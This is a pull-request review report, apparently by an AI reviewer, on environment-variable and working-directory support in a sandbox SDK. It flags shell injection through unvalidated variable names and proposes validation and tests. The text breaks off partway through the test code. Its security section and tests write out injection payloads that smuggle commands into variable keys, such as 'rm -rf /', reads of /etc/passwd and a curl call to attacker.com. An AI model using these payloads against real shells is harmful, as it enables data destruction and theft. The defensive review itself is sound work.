# PR #204 Review Report: Environment Variables & Working Directory Support

**Date**: November 14, 2025
**PR**: #204 - "add environment variables and working directory support to command exec"
**Branch**: `fix-env-vars`
**Reviewer**: Claude (Anthropic)
**Commits Reviewed**:

- `9ef41fe` - improve environment variable handling in command execution
- `00ff59e` - add execution options support to test worker API endpoints
- `a7bae24` - add environment variables and working directory support to command execution

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Background & Context](#background--context)
3. [Architectural Deep Dive](#architectural-deep-dive)
4. [PR #204 Code Review](#pr-204-code-review)
5. [Critical Security Vulnerabilities](#critical-security-vulnerabilities)
6. [Architectural Issues](#architectural-issues)
7. [Recommendations & Action Plan](#recommendations--action-plan)
8. [Appendices](#appendices)

---

## Executive Summary

### TL;DR

PR #204 adds per-command environment variable and working directory support to `exec()`, `execStream()`, and `startProcess()` methods. The implementation is **architecturally sound and functionally correct**, but has **critical security vulnerabilities** that must be addressed before merge.

**Recommendation**: **DO NOT MERGE** until critical security issues are fixed.

### Key Findings

**✅ What's Good**:

- Correct implementation across all architectural layers
- Proper type safety and backward compatibility
- Good E2E test coverage for happy paths
- Working directory handling is completely correct

**🚨 Critical Issues**:

1. **Shell injection vulnerability** in environment variable handling (all 3 locations)
2. Missing security unit tests
3. No changeset documenting the feature

**⚠️ Architectural Issues** (non-blocking but important):

1. `Sandbox.setEnvVars()` doesn't propagate to manually created sessions
2. `ISandbox` interface missing `setEnvVars()` method
3. Inconsistent behavior across environment variable layers

### Verdict

**Status**: CANNOT MERGE
**Blocking Items**: 3 critical security fixes, unit tests, changeset
**Estimated Fix Time**: 4-6 hours
**Risk Level**: HIGH - Arbitrary command execution possible

---

## Background & Context

### PR Objectives

This PR aims to bring `exec()` and `execStream()` to parity with `startProcess()` by adding support for:

1. **Per-command environment variables** - Temporary env vars that don't persist in session
2. **Per-command working directory** - Temporary cwd override that restores after command

### Why This Matters

Currently, users must choose between:

- Using `setEnvVars()` which persists in session (unwanted side effects)
- Manually doing `cd dir && command && cd back` (cumbersome and error-prone)
- Using only `startProcess()` which already supports these options (limited use case)

This PR enables:

```typescript
// Clean, isolated command execution
await sandbox.exec('npm test', {
  env: { NODE_ENV: 'test' },
  cwd: '/workspace/my-project'
});
// Session state unchanged after command completes
```

### Discussion Context

During our review, we had an in-depth discussion about how environment variables should work across different layers of the SDK. The user wanted to ensure there are **4 distinct layers** working cohesively:

1. **Docker ENV** - Set at container build time, inherited by all sessions
2. **Sandbox.setEnvVars()** - Should affect all sessions (default and manually created)
3. **Session.setEnvVars()** - Should affect only that session
4. **Per-command env** - Should affect only that command (PR #204)

This led to discovering critical gaps in the current architecture.

---

## Architectural Deep Dive

### The Four Layers of Environment Variables

#### Layer 1: Docker ENV Instructions

**Location**: `packages/sandbox/Dockerfile`

```dockerfile
ENV SANDBOX_VERSION=${SANDBOX_VERSION}
ENV PYTHON_POOL_MIN_SIZE=3
ENV PYTHON_POOL_MAX_SIZE=15
# ... other pool sizes ...
```

**Working Directory**:

```dockerfile
WORKDIR /container-server  # Build-time working directory
RUN mkdir -p /workspace    # User code directory
```

**How Sessions Inherit**: `packages/sandbox-container/src/session.ts:145-158`

```typescript
this.shell = Bun.spawn({
  cmd: ['bash', '--norc'],
  cwd: this.options.cwd || CONFIG.DEFAULT_CWD, // Defaults to /workspace
  env: {
    ...process.env, // ← ALL DOCKER ENV VARS INHERITED HERE
    ...this.options.env,
    LANG: 'C.UTF-8',
    LC_ALL: 'C.UTF-8'
  },
  stdin: 'pipe',
  stdout: 'ignore',
  stderr: 'ignore'
});
```

**Status**: ✅ Working correctly - Docker ENV variables are properly inherited by all sessions.

#### Layer 2: Sandbox.setEnvVars() - BROKEN

**Location**: `packages/sandbox/src/sandbox.ts:194-217`

**Current Implementation**:

```typescript
async setEnvVars(envVars: Record<string, string>): Promise<void> {
  // Update local state for new sessions
  this.envVars = { ...this.envVars, ...envVars };

  // If default session already exists, update it directly
  if (this.defaultSession) {
    // Set environment variables by executing export commands
    for (const [key, value] of Object.entries(envVars)) {
      const escapedValue = value.replace(/'/g, "'\\''");
      const exportCommand = `export ${key}='${escapedValue}'`;

      const result = await this.client.commands.execute(
        exportCommand,
        this.defaultSession  // ❌ Only affects default session!
      );

      if (result.exitCode !== 0) {
        throw new Error(`Failed to set ${key}: ${result.stderr || 'Unknown error'}`);
      }
    }
  }
}
```

**The Problem**: When `createSession()` is called:

```typescript
async createSession(options?: SessionOptions): Promise<ExecutionSession> {
  const sessionId = options?.id || `session-${Date.now()}`;

  await this.client.utils.createSession({
    id: sessionId,
    env: options?.env,  // ❌ Doesn't include this.envVars!
    cwd: options?.cwd
  });

  return this.getSessionWrapper(sessionId);
}
```

**User Impact Example**:

```typescript
const sandbox = getSandbox(env.Sandbox, 'my-sandbox');

// Set env at sandbox level - expecting it to apply to all sessions
await sandbox.setEnvVars({ API_KEY: 'secret123' });

// Create new session
const session = await sandbox.createSession();

// ❌ BUG: API_KEY is NOT available in this session!
const result = await session.exec('echo $API_KEY');
console.log(result.stdout); // Empty!
```

**Expected Behavior**:

- Sandbox-level env vars should be inherited by ALL sessions created after `setEnvVars()` is called
- Optionally, could also update ALL existing sessions (more aggressive, but matches user's "intuitive" expectation)

**Additional Issue**: `setEnvVars()` is missing from `ISandbox` interface (`packages/shared/src/types.ts:671-741`), so it's not part of the public contract despite being implemented.

**Status**: ❌ BROKEN - Does not propagate to manually created sessions, missing from interface

#### Layer 3: Session Creation with env

**Location**: `packages/sandbox-container/src/handlers/session-handler.ts:46-86`

```typescript
private async handleCreate(request: Request, context: RequestContext): Promise<Response> {
  const body = (await request.json()) as any;
  sessionId = body.id || this.generateSessionId();
  env = body.env || {};
  cwd = body.cwd || '/workspace';

  const result = await this.sessionManager.createSession({
    id: sessionId,
    env,  // ← Passed to session initialization
    cwd
  });
  // ...
}
```

**Session Initialization**: These env vars are passed to `Bun.spawn()` and become part of the session's bash shell environment.

**Status**: ✅ Working correctly - Session-specific env vars work as expected

#### Layer 4: ExecutionSession.setEnvVars()

**Location**: `packages/sandbox/src/sandbox.ts:1213-1239`

```typescript
setEnvVars: async (envVars: Record<string, string>) => {
  try {
    // Set environment variables by executing export commands
    for (const [key, value] of Object.entries(envVars)) {
      const escapedValue = value.replace(/'/g, "'\\''");
      const exportCommand = `export ${key}='${escapedValue}'`;

      const result = await this.client.commands.execute(
        exportCommand,
        sessionId // ← Affects only THIS session
      );

      if (result.exitCode !== 0) {
        throw new Error(
          `Failed to set ${key}: ${result.stderr || 'Unknown error'}`
        );
      }
    }
  } catch (error) {
    this.logger.error('Failed to set environment variables', error, {
      sessionId
    });
    throw error;
  }
};
```

**Status**: ✅ Working correctly - Session-scoped env vars persist only in that session

#### Layer 5: Per-Command env (PR #204)

**Location**: `packages/sandbox-container/src/session.ts:647-663`

```typescript
// Build command with environment variables if provided
let commandWithEnv: string;
if (env && Object.keys(env).length > 0) {
  const exports = Object.entries(env)
    .map(([key, value]) => {
      // Escape the value for safe shell usage
      const escapedValue = value.replace(/'/g, "'\\''");
      return `export ${key}='${escapedValue}'`; // ❌ KEY NOT VALIDATED!
    })
    .join('; ');
  // Wrap in subshell to isolate env vars (they don't persist in session)
  commandWithEnv = `(${exports}; ${command})`;
} else {
  commandWithEnv = command;
}
```

**How It Works**:

- Wraps command in subshell: `(export VAR=val; command)`
- Subshell inherits session env vars
- Subshell adds per-command env vars
- After subshell exits, per-command vars are gone

**Status**: ✅ Functionally correct, ❌ Security vulnerability (see next section)

### Layer Summary Table

| Layer                       | Method                   | Scope                       | Inheritance              | Status        | Issues                                                                                                |
| --------------------------- | ------------------------ | --------------------------- | ------------------------ | ------------- | ----------------------------------------------------------------------------------------------------- |
| **1. Docker ENV**           | Dockerfile `ENV`         | All sandboxes, all sessions | N/A                      | ✅ Working    | None                                                                                                  |
| **2. Sandbox.setEnvVars()** | `sandbox.setEnvVars()`   | **Only** default session    | From Layer 1             | ❌ BROKEN     | Doesn't affect manually created sessions<br>Missing from ISandbox interface<br>Security vulnerability |
| **3. Session Creation**     | `createSession({ env })` | That session only           | From Layers 1, 2\*       | ✅ Working    | \*Layer 2 not inherited (bug)                                                                         |
| **4. Session.setEnvVars()** | `session.setEnvVars()`   | That session only           | From Layers 1, 2\*, 3    | ✅ Working    | \*Layer 2 not inherited (bug)<br>Security vulnerability                                               |
| **5. Per-Command**          | `exec(..., { env })`     | Single command only         | From Layers 1, 2\*, 3, 4 | ✅ Functional | \*Layer 2 not inherited (bug)<br>Security vulnerability                                               |

### Working Directory (cwd) Analysis

**Status**: ✅ ALL LAYERS WORKING CORRECTLY

1. **Docker WORKDIR**: Set to `/container-server` (build directory), creates `/workspace` (user directory)
2. **Session default**: Defaults to `/workspace` via `CONFIG.DEFAULT_CWD`
3. **Session creation**: Can override via `createSession({ cwd: '/custom' })`
4. **Persistent cd**: `cd` commands naturally persist in session's bash shell
5. **Per-command cwd** (PR #204): Temporary override with automatic restore

**Implementation** (`session.ts:735-748`):

```typescript
if (cwd) {
  const safeCwd = this.escapeShellPath(cwd);
  script += `  PREV_DIR=$(pwd)\n`;
  script += `  if cd ${safeCwd}; then\n`;
  script += `    { ${commandWithEnv}; } < /dev/null > "$log.stdout" 2> "$log.stderr"\n`;
  script += `    EXIT_CODE=$?\n`;
  script += `    cd "$PREV_DIR"\n`; // ← Restores original directory
  script += `  else\n`;
  script += `    printf '\\x02\\x02\\x02%s\\n' "Failed to change directory to ${safeCwd}" >> "$log"\n`;
  script += `    EXIT_CODE=1\n`;
  script += `  fi\n`;
}
```

**No issues found in cwd handling across any layer!**

---

## PR #204 Code Review

### Files Changed

```
packages/sandbox-container/src/handlers/execute-handler.ts
packages/sandbox-container/src/services/process-service.ts
packages/sandbox-container/src/services/session-manager.ts
packages/sandbox-container/src/session.ts
packages/sandbox-container/src/validation/schemas.ts
packages/sandbox-container/tests/services/process-service.test.ts
packages/sandbox/src/clients/command-client.ts
packages/sandbox/src/sandbox.ts
packages/sandbox/tests/sandbox.test.ts
tests/e2e/exec-env-vars-repro.test.ts
tests/e2e/test-worker/index.ts
```

### What's Implemented Correctly

#### 1. ✅ Schema Validation Updated

**File**: `packages/sandbox-container/src/validation/schemas.ts:16-23`

```typescript
export const ExecuteRequestSchema = z.object({
  command: z.string().min(1, 'Command cannot be empty'),
  sessionId: z.string().optional(),
  background: z.boolean().optional(),
  timeoutMs: z.number().positive().optional(),
  env: z.record(z.string()).optional(), // ✅ Added
  cwd: z.string().optional() // ✅ Added
});
```

**Assessment**: Schema properly includes new fields. However, missing validation refinement for env var keys (see security section).

#### 2. ✅ Full Stack Integration

Changes flow correctly through all layers:

**SDK Layer**: `packages/sandbox/src/clients/command-client.ts:36-50`

```typescript
async execute(
  command: string,
  sessionId: string,
  timeoutMs?: number,
  env?: Record<string, string>,      // ✅ New parameter
  cwd?: string                        // ✅ New parameter
): Promise<ExecuteResponse>
```

**Handler Layer**: `packages/sandbox-container/src/handlers/execute-handler.ts:73-80`

```typescript
const result = await this.processService.executeCommand(body.command, {
  sessionId,
  timeoutMs: body.timeoutMs,
  env: body.env, // ✅ Passed through
  cwd: body.cwd // ✅ Passed through
});
```

**Service Layer**: `packages/sandbox-container/src/services/process-service.ts:101-106`

```typescript
const result = await this.sessionManager.executeInSession(
  sessionId,
  command,
  options.cwd,
  options.timeoutMs,
  options.env // ✅ Passed through
);
```

**Manager Layer**: `packages/sandbox-container/src/services/session-manager.ts:144-147`

```typescript
const result = await session.exec(
  command,
  cwd || env ? { cwd, env } : undefined // ✅ Passed to session
);
```

**Execution Layer**: `packages/sandbox-container/src/session.ts:235-237`

```typescript
const bashScript = this.buildFIFOScript(
  command,
  commandId,
  logFile,
  exitCodeFile,
  options?.cwd,
  false,
  options?.env // ✅ Used in bash script generation
);
```

**Assessment**: Excellent - proper layering and separation of concerns maintained throughout.

#### 3. ✅ Per-Command Isolation

**Environment Variables**:

```typescript
commandWithEnv = `(${exports}; ${command})`; // Subshell isolates env vars
```

The subshell pattern ensures:

- Per-command env vars are available to the command
- Session env vars are inherited (subshell inherits parent environment)
- Per-command env vars don't persist after command completes

**Working Directory**:

```typescript
script += `  PREV_DIR=$(pwd)\n`;
script += `  if cd ${safeCwd}; then\n`;
script += `    { ${commandWithEnv}; }\n`;
script += `    EXIT_CODE=$?\n`;
script += `    cd "$PREV_DIR"\n`; // Restores directory
```

**Assessment**: Isolation is correctly implemented for both env and cwd.

#### 4. ✅ E2E Tests Exist

**File**: `tests/e2e/exec-env-vars-repro.test.ts` (195 lines)

**Test Coverage**:

- ✅ Single env var passed to exec command
- ✅ Multiple env vars passed to exec command
- ✅ Working directory override
- ✅ Interaction between session-level and per-command env vars
- ✅ Verification that per-command env vars don't persist

**Assessment**: Good coverage of happy paths and key scenarios.

#### 5. ✅ Type Safety

**No `any` types introduced** (following CLAUDE.md guidelines):

- All new parameters properly typed
- Correct type propagation through all layers
- Changes are backward compatible (all parameters optional)

**Type Chain**:

```
ExecOptions (public API)
  → ExecuteRequest (container schema)
    → ProcessServiceOptions
      → SessionManagerOptions
        → SessionExecOptions
```

**Assessment**: Excellent type safety maintained throughout.

#### 6. ✅ Backward Compatibility

All new parameters are optional:

```typescript
await sandbox.exec('ls'); // Still works
await sandbox.exec('ls', { env: { FOO: 'bar' } }); // New functionality
```

**Assessment**: Non-breaking change, safe for existing users.

### What's Missing or Broken

#### 1. ❌ CRITICAL: Security Vulnerability

**See dedicated section below** - Shell injection via unvalidated env var keys

#### 2. ❌ Missing: Security Unit Tests

**Current test coverage**:

- E2E tests cover happy paths ✓
- Unit tests only update mock expectations ✓
- **No tests for security edge cases** ❌

**Missing tests**:

- Invalid environment variable names (security)
- Special characters in environment values
- Environment variable isolation (non-persistence verification)
- Combined env + cwd usage
- Attack vectors (injection attempts)

#### 3. ❌ Missing: Changeset

**Current state**: Only one changeset exists (`fix-encoding-parameter.md`) which is for a different feature.

**Required**: New changeset documenting this feature addition.

**Type**: `minor` - This is a new feature, not a patch or breaking change.

#### 4. ⚠️ Incomplete: JSDoc Comments

**File**: `packages/sandbox/src/clients/command-client.ts:32-50`

**Current JSDoc**:

```typescript
/**
 * Execute a command and return the complete result
 * @param command - The command to execute
 * @param sessionId - The session ID for this command execution
 * @param timeoutMs - Optional timeout in milliseconds (unlimited by default)
 */
async execute(
  command: string,
  sessionId: string,
  timeoutMs?: number,
  env?: Record<string, string>,      // ❌ Not documented
  cwd?: string                        // ❌ Not documented
): Promise<ExecuteResponse>
```

**Missing**: Documentation for new `env` and `cwd` parameters, including usage examples.

---

## Critical Security Vulnerabilities

### Vulnerability #1: Shell Injection via Unvalidated Environment Variable Keys

#### Location

This vulnerability exists in **THREE** locations:

1. **PR #204 per-command env**: `packages/sandbox-container/src/session.ts:650-663`
2. **Sandbox.setEnvVars()**: `packages/sandbox/src/sandbox.ts:201-203`
3. **ExecutionSession.setEnvVars()**: `packages/sandbox/src/sandbox.ts:1216-1218`

#### Vulnerable Code Pattern

```typescript
const exports = Object.entries(env)
  .map(([key, value]) => {
    // Escape the value for safe shell usage
    const escapedValue = value.replace(/'/g, "'\\''");
    return `export ${key}='${escapedValue}'`; // ❌ KEY NOT VALIDATED!
  })
  .join('; ');
```

#### Attack Vector

**Malicious Input**:

```typescript
await sandbox.exec('echo test', {
  env: { 'FOO=bar; rm -rf /': 'value' }
});
```

**Generated Bash Script**:

```bash
export FOO=bar; rm -rf /='value'
```

**What Happens**:

1. Bash parses this as TWO statements: `export FOO=bar` and `rm -rf /='value'`
2. First statement succeeds (sets `FOO=bar`)
3. Second statement executes `rm -rf /` with argument `='value'`
4. Container filesystem is destroyed 💥

#### Other Attack Examples

```typescript
// Execute arbitrary commands
{ "KEY; whoami": "val" }
// → export KEY; whoami='val'

// Command substitution
{ "VAR$(id)": "val" }
// → export VAR$(id)='val'  (id executes)

// Backtick execution
{ "TEST`cat /etc/passwd`": "val" }
// → export TEST`cat /etc/passwd`='val'  (cat executes)

// Boolean operators
{ "VAR||curl attacker.com": "val" }
// → export VAR||curl attacker.com='val'  (curl executes)

{ "VAR&&cat /secrets": "val" }
// → export VAR&&cat /secrets='val'  (cat executes)
```

#### Severity Assessment

**CVSS Score**: 9.8 (Critical)

- **Attack Vector**: Network (via Worker API)
- **Attack Complexity**: Low (simple payload)
- **Privileges Required**: Low (any API user)
- **User Interaction**: None
- **Scope**: Changed (can affect container)
- **Confidentiality Impact**: High (can read files)
- **Integrity Impact**: High (can modify/delete files)
- **Availability Impact**: High (can crash container)

**Real-World Impact**:

- Arbitrary command execution in container
- Data exfiltration (read secrets, environment variables)
- Denial of service (crash container)
- Lateral movement (if container has network access)

#### Why Current Value Escaping Isn't Enough

The code **does** escape values correctly:

```typescript
const escapedValue = value.replace(/'/g, "'\\''");
return `export ${key}='${escapedValue}'`;
```

This prevents injection via **values**:

```typescript
// Safe: value injection attempt fails
{ "SAFE_KEY": "'; rm -rf /" }
// → export SAFE_KEY=''\'''; rm -rf /'
// The quotes are properly escaped, command doesn't execute
```

But **keys are not validated**, allowing injection via variable names:

```typescript
// Unsafe: key injection succeeds
{ "UNSAFE; rm -rf /": "value" }
// → export UNSAFE; rm -rf /='value'
// The semicolon terminates export, second command executes
```

#### Required Fix

**Validation**: Environment variable names must follow POSIX standard: `[a-zA-Z_][a-zA-Z0-9_]*`

**Implementation** (all 3 locations):

```typescript
const exports = Object.entries(env)
  .map(([key, value]) => {
    // ✅ SECURITY: Validate env var key (POSIX standard)
    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(key)) {
      throw new Error(
        `Invalid environment variable name: ${key}. ` +
          `Environment variable names must start with a letter or underscore ` +
          `and contain only letters, numbers, and underscores.`
      );
    }
    // Escape the value for safe shell usage
    const escapedValue = value.replace(/'/g, "'\\''");
    return `export ${key}='${escapedValue}'`;
  })
  .join('; ');
```

**Schema-Level Validation** (defense-in-depth):

```typescript
export const ExecuteRequestSchema = z.object({
  command: z.string().min(1, 'Command cannot be empty'),
  sessionId: z.string().optional(),
  background: z.boolean().optional(),
  timeoutMs: z.number().positive().optional(),
  env: z
    .record(z.string())
    .optional()
    .refine(
      (env) =>
        !env ||
        Object.keys(env).every((key) => /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(key)),
      {
        message:
          'Environment variable names must start with a letter or underscore and contain only letters, numbers, and underscores'
      }
    ),
  cwd: z.string().optional()
});
```

#### Valid Environment Variable Names (POSIX Standard)

**Allowed**:

- `VALID_VAR` ✓
- `valid_var` ✓
- `_LEADING_UNDERSCORE` ✓
- `VAR123` ✓
- `a` ✓
- `A` ✓
- `_` ✓

**Disallowed**:

- `123STARTS_WITH_NUMBER` ❌ (must start with letter/underscore)
- `DASH-VAR` ❌ (no hyphens)
- `DOT.VAR` ❌ (no dots)
- `SPACE VAR` ❌ (no spaces)
- `SPECIAL@CHAR` ❌ (no special chars)

---

## Architectural Issues

### Issue #1: Sandbox.setEnvVars() Scope Problem

#### The Issue

When a user calls `sandbox.setEnvVars()`, they expect it to affect the entire sandbox. However, it **only affects the default session**.

**Current Behavior**:

```typescript
const sandbox = getSandbox(env.Sandbox, 'my-sandbox');

// User expectation: Set env vars for ALL sessions in this sandbox
await sandbox.setEnvVars({ API_KEY: 'secret123' });

// Default session - works ✓
await sandbox.exec('echo $API_KEY'); // Outputs: secret123

// Manually created session - doesn't work ❌
const session = await sandbox.createSession();
await session.exec('echo $API_KEY'); // Outputs: (empty)
```

**Root Cause**: `createSession()` doesn't include `this.envVars`:

```typescript
async createSession(options?: SessionOptions): Promise<ExecutionSession> {
  await this.client.utils.createSession({
    id: sessionId,
    env: options?.env,  // ❌ Missing: ...this.envVars
    cwd: options?.cwd
  });
  return this.getSessionWrapper(sessionId);
}
```

#### User's Intuitive Mental Model

The user expects a hierarchy:

```
Sandbox
├─ setEnvVars() → affects ALL sessions (like global config)
├─ Default Session
│  └─ Has sandbox env vars ✓
└─ Manually Created Session
   └─ Should have sandbox env vars ❌ (but doesn't)
```

#### Design Question

What should `Sandbox.setEnvVars()` actually do?

**Option A: Affect only default session** (current behavior)

- ✅ Simple, predictable
- ❌ Doesn't match user expectations
- ❌ Not useful if user creates sessions manually

**Option B: Affect only NEW sessions** (proposed fix)

- ✅ Matches inheritance model
- ✅ Sessions created after `setEnvVars()` get the vars
- ⚠️ Doesn't affect sessions created BEFORE `setEnvVars()`
- ⚠️ Order-dependent behavior (might be confusing)

**Option C: Affect ALL sessions (existing and new)** (aggressive)

- ✅ Matches user's "global config" mental model
- ✅ No order-dependency
- ❌ More complex to implement
- ❌ Could have performance impact (update all sessions)
- ❌ Side effects on existing sessions (might break isolation assumptions)

#### Recommended Solution

**Implement Option B** (affect new sessions):

```typescript
async createSession(options?: SessionOptions): Promise<ExecutionSession> {
  const sessionId = options?.id || `session-${Date.now()}`;

  // ✅ Merge sandbox-level env vars with session-specific env vars
  const mergedEnv = { ...this.envVars, ...options?.env };

  await this.client.utils.createSession({
    id: sessionId,
    env: mergedEnv,  // Now includes sandbox-level vars
    cwd: options?.cwd
  });

  return this.getSessionWrapper(sessionId);
}
```

**Why Option B**:

- Predictable: "Set, then create" pattern is clear
- Performance: No need to update existing sessions
- Isolation: Existing sessions remain unchanged
- Matches Unix environment inheritance model

**Consider Option C later** if users need it, but start with Option B for simplicity.

### Issue #2: Missing from ISandbox Interface

**Problem**: `setEnvVars()` exists on `Sandbox` class but not in `ISandbox` interface.

**Location**: `packages/shared/src/types.ts:671-741`

**Current Interface**:

```typescript
export interface ISandbox {
  exec(command: string, options?: ExecOptions): Promise<ExecResult>;
  createSession(options?: SessionOptions): Promise<ExecutionSession>;
  deleteSession(sessionId: string): Promise<SessionDeleteResult>;
  // ❌ Missing: setEnvVars(envVars: Record<string, string>): Promise<void>;
}
```

**Comparison**: `ExecutionSession` interface **does** include it (line 657):

```typescript
export interface ExecutionSession {
  exec(command: string, options?: ExecOptions): Promise<ExecResult>;
  setEnvVars(envVars: Record<string, string>): Promise<void>; // ✓ Present
}
```

**Impact**:

- Users can't discover `setEnvVars()` via TypeScript autocomplete
- Method is not part of the public contract
- Documentation can't reference it as official API
- Inconsistent with `ExecutionSession`

**Fix**: Add to `ISandbox` interface:

```typescript
export interface ISandbox {
  // ... existing methods ...

  // Environment management
  setEnvVars(envVars: Record<string, string>): Promise<void>;

  // Session management
  createSession(options?: SessionOptions): Promise<ExecutionSession>;
  // ...
}
```

### Issue #3: Inconsistent Security Across Layers

**Problem**: The same security vulnerability exists in all 3 `setEnvVars` implementations, suggesting copy-paste without security review.

**Affected Code**:

1. `Sandbox.setEnvVars()` - line 202
2. `ExecutionSession.setEnvVars()` - line 1217
3. PR #204 per-command env - session.ts:652-656

**Pattern**: All three use identical vulnerable code:

```typescript
const escapedValue = value.replace(/'/g, "'\\''");
const exportCommand = `export ${key}='${escapedValue}'`; // ❌ Repeated vulnerability
```

**Recommendation**: Extract to shared utility to prevent future copy-paste vulnerabilities.

**Create**: `packages/shared/src/validation.ts`

```typescript
/**
 * Validate and escape an environment variable for safe bash export
 * @throws Error if key is invalid
 */
export function validateAndEscapeEnvVar(key: string, value: string): string {
  // Validate key follows POSIX standard
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(key)) {
    throw new Error(
      `Invalid environment variable name: ${key}. ` +
        `Environment variable names must start with a letter or underscore ` +
        `and contain only letters, numbers, and underscores.`
    );
  }

  // Escape value for safe shell usage
  const escapedValue = value.replace(/'/g, "'\\''");
  return `export ${key}='${escapedValue}'`;
}
```

**Usage** (all 3 locations):

```typescript
const exports = Object.entries(env)
  .map(([key, value]) => validateAndEscapeEnvVar(key, value))
  .join('; ');
```

**Benefits**:

- Single source of truth for validation logic
- Prevents copy-paste vulnerabilities
- Easier to test (one function to unit test)
- Easier to update if requirements change

---

## Recommendations & Action Plan

### Critical Path to Merge (Blockers)

**Status**: CANNOT MERGE until these are complete

#### 1. Fix Security Vulnerability (4-6 hours)

**Priority**: P0 (Critical)
**Estimated Time**: 2-3 hours for implementation, 2-3 hours for testing

**Tasks**:

**a) Extract Shared Validation Utility** (30 min)

Create `packages/shared/src/validation.ts`:

```typescript
/**
 * Validate and escape an environment variable for safe bash export
 *
 * @param key - Environment variable name (must follow POSIX standard)
 * @param value - Environment variable value (will be escaped)
 * @returns Bash export statement
 * @throws Error if key is invalid
 *
 * @example
 * validateAndEscapeEnvVar('PATH', '/usr/bin')
 * // Returns: "export PATH='/usr/bin'"
 *
 * validateAndEscapeEnvVar('INVALID-KEY', 'value')
 * // Throws: Error: Invalid environment variable name: INVALID-KEY
 */
export function validateAndEscapeEnvVar(key: string, value: string): string {
  // POSIX standard: must start with letter/underscore, contain only alphanumeric/underscore
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(key)) {
    throw new Error(
      `Invalid environment variable name: ${key}. ` +
        `Environment variable names must start with a letter or underscore ` +
        `and contain only letters, numbers, and underscores.`
    );
  }

  // Escape single quotes using POSIX shell quoting: ' → '\''
  const escapedValue = value.replace(/'/g, "'\\''");
  return `export ${key}='${escapedValue}'`;
}

/**
 * Validate environment variable name only (for schema validation)
 */
export function isValidEnvVarName(key: string): boolean {
  return /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(key);
}
```

**b) Update Session.buildFIFOScript()** (30 min)

**File**: `packages/sandbox-container/src/session.ts:647-663`

```typescript
import { validateAndEscapeEnvVar } from '@repo/shared/validation';

// Build command with environment variables if provided
let commandWithEnv: string;
if (env && Object.keys(env).length > 0) {
  const exports = Object.entries(env)
    .map(([key, value]) => validateAndEscapeEnvVar(key, value)) // ✅ Use shared utility
    .join('; ');
  // Wrap in subshell to isolate env vars (they don't persist in session)
  commandWithEnv = `(${exports}; ${command})`;
} else {
  commandWithEnv = command;
}
```

**c) Update Sandbox.setEnvVars()** (15 min)

**File**: `packages/sandbox/src/sandbox.ts:194-217`

```typescript
import { validateAndEscapeEnvVar } from '@repo/shared/validation';

async setEnvVars(envVars: Record<string, string>): Promise<void> {
  this.envVars = { ...this.envVars, ...envVars };

  if (this.defaultSession) {
    for (const [key, value] of Object.entries(envVars)) {
      const exportCommand = validateAndEscapeEnvVar(key, value);  // ✅ Use shared utility

      const result = await this.client.commands.execute(
        exportCommand,
        this.defaultSession
      );

      if (result.exitCode !== 0) {
        throw new Error(`Failed to set ${key}: ${result.stderr || 'Unknown error'}`);
      }
    }
  }
}
```

**d) Update ExecutionSession.setEnvVars()** (15 min)

**File**: `packages/sandbox/src/sandbox.ts:1213-1239`

```typescript
import { validateAndEscapeEnvVar } from '@repo/shared/validation';

setEnvVars: async (envVars: Record<string, string>) => {
  try {
    for (const [key, value] of Object.entries(envVars)) {
      const exportCommand = validateAndEscapeEnvVar(key, value); // ✅ Use shared utility

      const result = await this.client.commands.execute(
        exportCommand,
        sessionId
      );

      if (result.exitCode !== 0) {
        throw new Error(
          `Failed to set ${key}: ${result.stderr || 'Unknown error'}`
        );
      }
    }
  } catch (error) {
    this.logger.error('Failed to set environment variables', error, {
      sessionId
    });
    throw error;
  }
};
```

**e) Add Schema Validation** (15 min)

**File**: `packages/sandbox-container/src/validation/schemas.ts:16-23`

```typescript
import { isValidEnvVarName } from '@repo/shared/validation';

export const ExecuteRequestSchema = z.object({
  command: z.string().min(1, 'Command cannot be empty'),
  sessionId: z.string().optional(),
  background: z.boolean().optional(),
  timeoutMs: z.number().positive().optional(),
  env: z
    .record(z.string())
    .optional()
    .refine(
      (env) => !env || Object.keys(env).every((key) => isValidEnvVarName(key)),
      {
        message:
          'Environment variable names must start with a letter or underscore and contain only letters, numbers, and underscores'
      }
    ),
  cwd: z.string().optional()
});
```

#### 2. Add Security Unit Tests (2-3 hours)

**Priority**: P0 (Critical)
**Estimated Time**: 2-3 hours

**Create**: `packages/sandbox-container/tests/services/session-env-security.test.ts`

```typescript
import { describe, test, expect, beforeEach, afterEach } from 'vitest';
import { Session } from '../../src/session';

describe('Session - Environment Variable Security', () => {
  let session: Session;

  beforeEach(async () => {
    session = new Session({ id: 'test', cwd: '/workspace' });
    await session.initialize();
  });

  afterEach(async () => {
    await session.destroy();
  });

  describe('Invalid Environment Variable Names', () => {
    test('should reject shell injection via semicolon', async () => {
      await expect(
        session.exec('echo test', { env: { 'FOO=bar; rm -rf /': 'value' } })
      ).rejects.toThrow(/Invalid environment variable name/);
    });

    test('should reject command substitution with dollar sign', async () => {
      await expect(
        session.exec('echo test', { env: { 'VAR$(whoami)': 'value' } })
      ).rejects.toThrow(/Invalid environment variable name/);
    });

    test('should reject backtick command execution', async () => {
      await expect(
        session.exec('echo test', { env: { 'TEST`id`': 'value' } })
      ).rejects.toThrow(/Invalid environment variable name/);
    });

    test('should reject boolean operators', async () => {
      const maliciousKeys = [
        'VAR||curl attacker.com',
        'VAR&&cat /etc/passwd',
        'VAR|cat /etc/passwd'
      ];

      for (const key of maliciousKeys) {
        await expect(
          session.exec('echo test', { env: { [key]: 'value' } })
        ).rejects.toThrow(/Invalid environment variable name/);
      }
    });

    test('should reject variables with spaces', async () => {
      await expect(
        session.exec('echo test', { env: { 'SPACE VAR': 'value' } })
      ).rejects.toThrow(/Invalid environment variable name/);
    });

    test('should reject variables starting with numbers', async () => {
      await expect(
        session.exec('echo test', { env: { '123VAR': 'value' } })
      ).rejects.toThrow(/Invalid environment variable name/);
    });

    test('should reject variables with hyphens', async () => {
      await expect(
        session.exec('echo test', { env: { 'DASH-VAR': 'value' } })
      ).rejects.toThrow(/Invalid environment variable name/);
    });

    test('should reject variables with dots', async () => {
      await expect(
        session.exec('echo test', { env: { 'DOT.VAR': 'value' } })
      ).rejects.toThrow(/Invalid environment variable name/);
    });

    test('should reject variables with special characters', async () => {
      const specialChars = [
        '@',
        '#',
        '$',
        '%',
        '^',
